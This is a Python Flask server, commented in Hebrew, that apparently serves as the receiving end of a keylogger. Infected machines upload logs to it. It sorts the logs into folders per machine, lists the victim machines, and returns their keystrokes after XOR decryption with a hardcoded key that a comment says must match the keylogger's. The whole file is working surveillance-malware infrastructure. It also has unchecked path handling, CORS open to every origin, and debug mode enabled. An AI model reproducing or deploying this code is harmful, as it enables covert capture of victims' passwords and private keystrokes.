from flask import Flask, request, jsonify
import os
import time
import logging
from flask_cors import CORS

app = Flask(__name__)
DATA_FOLDER = "data"
CORS(app, resources={r"/api/*": {"origins": "*"}})

# הגדרת לוגים
logging.basicConfig(filename="server.log", level=logging.ERROR, format="%(asctime)s - %(levelname)s - %(message)s")

# יצירת תיקיית data אם אינה קיימת
if not os.path.exists(DATA_FOLDER):
    os.makedirs(DATA_FOLDER)

# מחלקת הצפנה
class Encryptor:
    def __init__(self, key: int):
        self.key = key

    def xor_encrypt(self, data: str) -> str:
        return ''.join(chr(ord(char) ^ self.key) for char in data)

    def xor_decrypt(self, data: str) -> str:
        return ''.join(chr(ord(char) ^ self.key) for char in data)

# יצירת שם קובץ מבוסס חותמת זמן
def generate_log_filename():
    return "log_" + time.strftime("%Y-%m-%d_%H-%M-%S") + ".txt"

@app.route('/api/upload', methods=['POST'])
def upload():
    data = request.get_json()

    if not data or "machine" not in data or "data" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    machine = data["machine"]
    log_data = data["data"]

    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        os.makedirs(machine_folder)

    filename = generate_log_filename()
    file_path = os.path.join(machine_folder, filename)

    with open(file_path, "w", encoding="utf-8") as f:
        f.write(log_data)

    return jsonify({"status": "success", "file": file_path}), 200

@app.route('/api/list_machines_target_get', methods=['GET'])
def list_machines():
    try:
        if not os.path.exists(DATA_FOLDER):
            return jsonify({"machines": []})

        machines = [name for name in os.listdir(DATA_FOLDER) if os.path.isdir(os.path.join(DATA_FOLDER, name))]
        return jsonify({"machines": machines})

    except Exception as e:
        logging.error(f"Error listing machines: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/keystrokes_get', methods=['GET'])
def get_target_machine_key_strokes():
    machine = request.args.get('computer')
    encryption_key = 123  # המפתח חייב להיות זהה למה שב-KeyLogger

    if not machine:
        return jsonify({"error": "Missing machine parameter"}), 400

    machine_folder = os.path.join(DATA_FOLDER, machine)
    if not os.path.exists(machine_folder):
        return jsonify({"error": "Machine not found"}), 404

    all_logs = []
    try:
        encryptor = Encryptor(key=encryption_key)
        for filename in sorted(os.listdir(machine_folder)):
            file_path = os.path.join(machine_folder, filename)
            with open(file_path, "r", encoding="utf-8") as f:
                encrypted_data = f.read()
                decrypted_data = encryptor.xor_decrypt(encrypted_data)
                all_logs.append(decrypted_data)

        return jsonify({"machine": machine, "keystrokes": all_logs})

    except Exception as e:
        logging.error(f"Error retrieving keystrokes: {e}")
        return jsonify({"error": str(e)}), 500



if __name__ == '__main__':
    app.run(debug=True)
